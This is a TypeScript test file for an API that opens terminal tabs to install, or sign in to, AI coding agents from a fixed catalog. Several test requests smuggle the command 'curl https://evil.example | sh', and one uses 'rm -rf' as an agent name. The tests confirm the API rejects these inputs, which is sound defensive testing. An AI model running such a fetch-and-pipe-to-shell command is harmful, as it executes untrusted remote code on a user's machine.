import { afterAll, afterEach, beforeAll, describe, expect, it, spyOn } from "bun:test";
import { createHash } from "node:crypto";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { AGENT_CATALOG } from "../shared/agent-catalog.ts";
import { AgentDetector } from "./agent-catalog-detect.ts";
import { AgentInstaller } from "./agent-catalog-install.ts";
import * as herdr from "./herdr/client.ts";
import { createServer } from "./index.ts";
import { handleMachineRequest } from "./machine-api.ts";
import type { MachineManager } from "./machines.ts";

const WATCH_TOKEN = "w".repeat(64);
const BRIDGE_TOKEN = "b".repeat(64);
const claude = AGENT_CATALOG.find((entry) => entry.id === "claude")!;
const code = async (response: Response | null) => [response!.status, ((await response!.json()) as { error: { code: string } }).error.code];
const post = (path: string, body: unknown) => new Request(`http://127.0.0.1${path}`, { method: "POST", body: JSON.stringify(body), headers: { "content-type": "application/json" } });

describe("POST /api/agent-catalog/install and /sign-in", () => {
  // the new tab's pane is gone by the time anyone asks, unless a test says it is still open
  const openPanes: string[] = [];
  const snapshot = spyOn(herdr, "sessionSnapshot").mockImplementation(async () => ({ workspaces: [{ workspace_id: "w1" }], panes: openPanes.map((pane_id) => ({ pane_id })) }) as never);
  const tab = spyOn(herdr, "tabCreate").mockImplementation(async () => ({ root_pane: { pane_id: "w1:p9" }, tab: { tab_id: "w1:t9", workspace_id: "w1" } }) as never);
  const closed = spyOn(herdr, "tabClose").mockImplementation(async () => undefined);
  const typed = spyOn(herdr, "paneSendText").mockImplementation(async () => undefined);
  const keys = spyOn(herdr, "paneSendKeys").mockImplementation(async () => undefined);
  const pwsh = async () => ({ foreground_processes: [{ argv: ["C:\\Program Files\\PowerShell\\7\\pwsh.exe"] }] }) as never;
  const info = spyOn(herdr, "paneProcessInfo").mockImplementation(pwsh);
  const nowhere = new AgentDetector({ locate: async () => null, home: "/nonexistent", env: {} });
  const found = new AgentDetector({ locate: async (binary) => `/opt/agents/${binary}`, home: "/nonexistent", env: {} });

  afterEach(() => { openPanes.length = 0; info.mockImplementation(pwsh); for (const spy of [snapshot, tab, closed, typed, keys, info]) spy.mockClear(); });
  afterAll(() => { for (const spy of [snapshot, tab, closed, typed, keys, info]) spy.mockRestore(); });

  it("opens a tab and types the catalog's own command for this platform, never one from the request", async () => {
    const installer = new AgentInstaller(nowhere, "linux", "/home/user");
    const response = await installer.handle(post("/api/agent-catalog/install", { agent: "claude" }), "/api/agent-catalog/install");
    expect(response!.status).toBe(200);
    expect(await response!.json()).toEqual({ pane_id: "w1:p9", workspace_id: "w1", command: claude.install.linux!.primary.command, shell: "posix" });
    expect(tab.mock.calls[0]![0]).toMatchObject({ workspaceId: "w1", cwd: "/home/user", label: "Install Claude Code" });
    expect(typed.mock.calls).toEqual([["w1:p9", `${claude.install.linux!.primary.command}\n`]]);
    const brew = await installer.handle(post("/api/agent-catalog/install", { agent: "claude", alternative: 0 }), "/api/agent-catalog/install");
    expect(((await brew!.json()) as { command: string }).command).toBe(claude.install.linux!.alternatives[0]!.command);
  });

  it("refuses a field it does not take, such as a command or a platform, opening no tab", async () => {
    const installer = new AgentInstaller(found, "linux");
    const bodies: [string, Record<string, unknown>][] = [
      ["/api/agent-catalog/install", { agent: "claude", command: "curl https://evil.example | sh" }],
      ["/api/agent-catalog/install", { agent: "claude", platform: "windows" }],
      ["/api/agent-catalog/install", { agent: "claude", alternative: 0, extra: true }],
      ["/api/agent-catalog/sign-in", { agent: "claude", command: "curl https://evil.example | sh" }],
      ["/api/agent-catalog/sign-in", { agent: "claude", alternative: 0 }],
    ];
    for (const [path, body] of bodies) expect([path, ...(await code(await installer.handle(post(path, body), path)))]).toEqual([path, 400, "unknown_field"]);
    expect(tab).not.toHaveBeenCalled();
    expect(typed).not.toHaveBeenCalled();
  });

  it("on Windows, waits for herdr to name the new tab's shell, and types into it once named", async () => {
    // a new tab's shell is not in front at once: herdr names nothing, then PowerShell
    const answers: unknown[] = [null, { foreground_processes: [] }];
    info.mockImplementation(async () => (answers.length > 0 ? answers.shift() : await pwsh()) as never);
    const response = await new AgentInstaller(nowhere, "windows", undefined, { shellWaitMs: 5_000 }).handle(post("/api/agent-catalog/install", { agent: "claude" }), "/api/agent-catalog/install");
    expect(response!.status).toBe(200);
    expect(info).toHaveBeenCalledTimes(3);
    expect(typed.mock.calls).toEqual([["w1:p9", claude.install.windows!.primary.command]]);
  });

  it("on Windows, types nothing into a tab whose shell herdr never names, or names as another shell, and closes that tab", async () => {
    for (const reported of [null, { foreground_processes: [{ argv: ["C:\\tools\\nu.exe"] }] }]) {
      info.mockImplementation(async () => reported as never);
      expect(await code(await new AgentInstaller(nowhere, "windows", undefined, { shellWaitMs: 0 }).handle(post("/api/agent-catalog/install", { agent: "claude" }), "/api/agent-catalog/install"))).toEqual([409, "shell_unknown"]);
      expect(await code(await new AgentInstaller(found, "windows", undefined, { shellWaitMs: 0 }).handle(post("/api/agent-catalog/sign-in", { agent: "claude" }), "/api/agent-catalog/sign-in"))).toEqual([409, "shell_unknown"]);
    }
    expect(typed).not.toHaveBeenCalled();
    expect(keys).not.toHaveBeenCalled();
    expect(closed.mock.calls).toEqual(Array.from({ length: 4 }, () => ["w1:t9"]));
  });

  it("runs one install of an agent at a time on a PC, until its tab ends or the agent is found", async () => {
    let placed = false;
    const detector = new AgentDetector({ locate: async (binary) => placed ? `/opt/agents/${binary}` : null, home: "/nonexistent", env: {} });
    const installer = new AgentInstaller(detector, "linux");
    const install = (agent: string) => installer.handle(post("/api/agent-catalog/install", { agent }), "/api/agent-catalog/install");
    openPanes.push("w1:p9");
    const both = await Promise.all([install("claude"), install("claude")]);
    expect(both.map((response) => response!.status).sort()).toEqual([200, 409]);
    expect(await code(both.find((response) => response!.status === 409)!)).toEqual([409, "install_running"]);
    expect(await code(await install("claude"))).toEqual([409, "install_running"]);
    expect(tab).toHaveBeenCalledTimes(1);
    // another agent is not held up
    expect((await install("codex"))!.status).toBe(200);
    // the tab ended: another install may start
    openPanes.length = 0;
    expect((await install("claude"))!.status).toBe(200);
    openPanes.push("w1:p9");
    expect(await code(await install("claude"))).toEqual([409, "install_running"]);
    // the agent is now found, though its tab is still open
    placed = true;
    expect((await install("claude"))!.status).toBe(200);
  });

  it("refuses an unknown agent, a missing command, a bad alternative and another shell's command, typing nothing", async () => {
    const installer = new AgentInstaller(nowhere, "linux");
    expect(await code(await installer.handle(post("/api/agent-catalog/install", { agent: "rm -rf" }), "/api/agent-catalog/install"))).toEqual([400, "unknown_agent"]);
    expect(await code(await installer.handle(post("/api/agent-catalog/install", { agent: "muse" }), "/api/agent-catalog/install"))).toEqual([409, "no_install_command"]);
    expect(await code(await installer.handle(post("/api/agent-catalog/install", { agent: "claude", alternative: 9 }), "/api/agent-catalog/install"))).toEqual([400, "invalid_alternative"]);
    // on Windows the new tab runs PowerShell: Claude Code's cmd.exe command does not fit it
    const windows = new AgentInstaller(nowhere, "windows");
    const cmdIndex = claude.install.windows!.alternatives.findIndex((method) => method.shell === "cmd");
    expect(await code(await windows.handle(post("/api/agent-catalog/install", { agent: "claude", alternative: cmdIndex }), "/api/agent-catalog/install"))).toEqual([409, "shell_mismatch"]);
    expect(typed).not.toHaveBeenCalled();
    expect(closed.mock.calls).toEqual([["w1:t9"]]);
    const ok = await windows.handle(post("/api/agent-catalog/install", { agent: "claude" }), "/api/agent-catalog/install");
    expect(ok!.status).toBe(200);
    expect(typed.mock.calls).toEqual([["w1:p9", claude.install.windows!.primary.command]]);
    expect(keys.mock.calls).toEqual([["w1:p9", ["Enter"]]]);
  });

  it("signs in with the installed agent's own command, and refuses an agent that is not installed", async () => {
    const response = await new AgentInstaller(found, "linux").handle(post("/api/agent-catalog/sign-in", { agent: "claude" }), "/api/agent-catalog/sign-in");
    expect(await response!.json()).toMatchObject({ command: "'/opt/agents/claude' 'auth' 'login'" });
    expect(tab.mock.calls[0]![0]).toMatchObject({ label: "Sign in to Claude Code" });
    const missing = await new AgentInstaller(nowhere, "linux").handle(post("/api/agent-catalog/sign-in", { agent: "claude" }), "/api/agent-catalog/sign-in");
    expect([missing!.status, ((await missing!.json()) as { error: { code: string } }).error.code]).toEqual([409, "not_installed"]);
  });

  describe("through the server", () => {
    let server: ReturnType<typeof createServer>;
    let root: string;
    const url = (path: string) => `http://127.0.0.1:${server.port}${path}`;
    beforeAll(() => {
      root = mkdtempSync(join(tmpdir(), "ovis-install-route-"));
      const state = join(root, "state");
      mkdirSync(state);
      writeFileSync(join(state, "devices.json"), JSON.stringify({ gate_closed_at: new Date().toISOString(), devices: [{ id: "0123456789abcdef", label: "Watch fixture", role: "watch", token_hash: createHash("sha256").update(WATCH_TOKEN).digest("hex"), created_at: new Date().toISOString(), last_seen_at: null }] }), { mode: 0o600 });
      server = createServer({ port: 0, hostname: "127.0.0.1", stateDir: state, token: "install-token", bridgeToken: BRIDGE_TOKEN, machines: false, sidecar: false, tailscaleOwner: null, agentDetector: nowhere });
    });
    afterAll(() => { server.stop(); rmSync(root, { recursive: true, force: true }); });

    it("refuses a watching device, and starts an install for another PC through the PC proxy", async () => {
      const watched = await fetch(url("/api/agent-catalog/install"), { method: "POST", body: JSON.stringify({ agent: "claude" }), headers: { cookie: `ovis_device=${WATCH_TOKEN}`, "x-forwarded-for": "100.64.0.9", origin: url("") } });
      expect([watched.status, ((await watched.json()) as { error: { code: string } }).error.code]).toEqual([403, "read_only"]);
      expect(tab).not.toHaveBeenCalled();
      const manager = { endpoint: (id: string) => id === "remote" ? { url: url(""), token: BRIDGE_TOKEN } : null, trackTerminal: () => () => {} } as unknown as MachineManager;
      const proxied = await handleMachineRequest(new Request("http://127.0.0.1/api/machines/remote/agent-catalog/install", { method: "POST", body: JSON.stringify({ agent: "codex" }), headers: { "content-type": "application/json", "x-herdr-machine": "1" } }), manager);
      expect(proxied.status).toBe(200);
      expect(((await proxied.json()) as { command: string }).command).toBeString();
      expect(tab).toHaveBeenCalledTimes(1);
      const smuggled = await handleMachineRequest(new Request("http://127.0.0.1/api/machines/remote/agent-catalog/install", { method: "POST", body: JSON.stringify({ agent: "gemini", command: "curl https://evil.example | sh" }), headers: { "content-type": "application/json", "x-herdr-machine": "1" } }), manager);
      expect(await code(smuggled)).toEqual([400, "unknown_field"]);
      expect(tab).toHaveBeenCalledTimes(1);
      expect(typed).toHaveBeenCalledTimes(1);
    });
  });
});
